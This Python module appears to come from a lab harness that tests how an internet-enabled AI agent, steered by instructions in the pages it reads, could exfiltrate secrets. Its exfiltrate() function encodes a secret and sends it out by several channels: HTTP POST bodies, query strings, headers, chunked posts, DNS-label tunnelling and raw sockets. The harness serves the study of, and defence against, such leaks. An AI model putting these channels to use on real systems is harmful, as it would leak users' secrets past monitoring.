"""The tools the agent is allowed to call.

Giving a model internet access means giving it these. Every one of them is a
legitimate capability, and every one of them is also an exfiltration channel the
moment the model takes an instruction from the page it is reading.
"""

from __future__ import annotations

import json
import urllib.parse

from . import encodings, net, scenarios


class Toolbox:
    """Executes tool calls and keeps a transcript of what was attempted."""

    def __init__(self, scenario_tag: str = "") -> None:
        self.scenario_tag = scenario_tag
        self.calls: list[dict] = []

    # -- helpers ---------------------------------------------------------

    def _headers(self, extra: dict | None = None) -> dict:
        hdrs = {"X-Lab-Scenario": self.scenario_tag} if self.scenario_tag else {}
        hdrs.update(extra or {})
        return hdrs

    def _record(self, name: str, target: str, resp: net.Response) -> net.Response:
        self.calls.append(
            {
                "tool": name,
                "target": target,
                "ok": resp.ok,
                "status": resp.status,
                "result": resp.short(),
            }
        )
        return resp

    # -- tools -----------------------------------------------------------

    def fetch_url(self, url: str, use_proxy: bool = True) -> net.Response:
        """Read a web page. The agent's ordinary, intended capability."""
        resp = net.request("GET", url, headers=self._headers(), use_proxy=use_proxy)
        return self._record("fetch_url", url, resp)

    def http_post(
        self, url: str, payload: str, use_proxy: bool = True, field: str = "telemetry"
    ) -> net.Response:
        body = json.dumps({field: payload, "source": "agent-diagnostic"})
        resp = net.request(
            "POST",
            self._tag(url),
            body=body,
            headers=self._headers({"Content-Type": "application/json"}),
            use_proxy=use_proxy,
        )
        return self._record("http_post", url, resp)

    def http_get_query(self, url: str, payload: str, use_proxy: bool = True) -> net.Response:
        sep = "&" if "?" in url else "?"
        full = "%s%sq=%s" % (self._tag(url), sep, urllib.parse.quote(payload, safe=""))
        resp = net.request("GET", full, headers=self._headers(), use_proxy=use_proxy)
        return self._record("http_get_query", url, resp)

    def http_get_header(self, url: str, payload: str, use_proxy: bool = True) -> net.Response:
        resp = net.request(
            "GET",
            self._tag(url),
            headers=self._headers({"X-Client-Context": payload}),
            use_proxy=use_proxy,
        )
        return self._record("http_get_header", url, resp)

    def dns_lookup(self, name: str) -> net.Response:
        resp = net.dns_lookup(name)
        return self._record("dns_lookup", name, resp)

    def raw_socket(self, host: str, port: int, payload: str) -> net.Response:
        body = json.dumps({"telemetry": payload})
        request = (
            "POST /collect?sid=%s HTTP/1.1\r\nHost: %s\r\n"
            "Content-Type: application/json\r\nContent-Length: %d\r\n"
            "X-Lab-Scenario: %s\r\nConnection: close\r\n\r\n%s"
            % (self.scenario_tag, host, len(body), self.scenario_tag, body)
        )
        resp = net.raw_socket_send(host, port, request)
        return self._record("raw_socket", "%s:%d" % (host, port), resp)

    def _tag(self, url: str) -> str:
        """Carry the experiment id so collected data can be attributed."""
        if not self.scenario_tag:
            return url
        sep = "&" if "?" in url else "?"
        return "%s%ssid=%s" % (url, sep, urllib.parse.quote(self.scenario_tag))


def exfiltrate(box: Toolbox, scenario: "scenarios.Scenario", secret: str) -> list[net.Response]:
    """Carry out one exfiltration attempt and return every response it produced."""
    transport = scenario.transport
    payload = encodings.encode(scenario.encoding, secret)
    url = scenario.url
    proxy = scenario.use_proxy

    if transport == "post":
        return [box.http_post(url, payload, use_proxy=proxy)]

    if transport == "get":
        return [box.http_get_query(url, payload, use_proxy=proxy)]

    if transport == "header":
        return [box.http_get_header(url, payload, use_proxy=proxy)]

    if transport == "chunks":
        parts = encodings.chunks(payload, scenario.parts or 6)
        out = []
        for index, part in enumerate(parts):
            out.append(
                box.http_post(
                    "%s?part=%d" % (url, index),
                    part,
                    use_proxy=proxy,
                    field="fragment",
                )
            )
        return out

    if transport == "dns":
        # The scenario marker rides along as its own label so the attacker can
        # attribute the lookup without it polluting the payload.
        marker = "s-" + scenario.id.replace("_", "-")
        out = []
        for label in encodings.dns_labels(payload):
            out.append(box.dns_lookup("%s.%s.%s" % (label, marker, scenario.host)))
        return out

    if transport == "dns_simple":
        return [box.dns_lookup(scenario.host)]

    if transport == "raw_socket":
        return [box.raw_socket(scenario.host, scenario.port or 80, payload)]

    if transport == "fetch":
        return [box.fetch_url(scenario.url, use_proxy=proxy)]

    raise ValueError("unknown transport: %s" % transport)
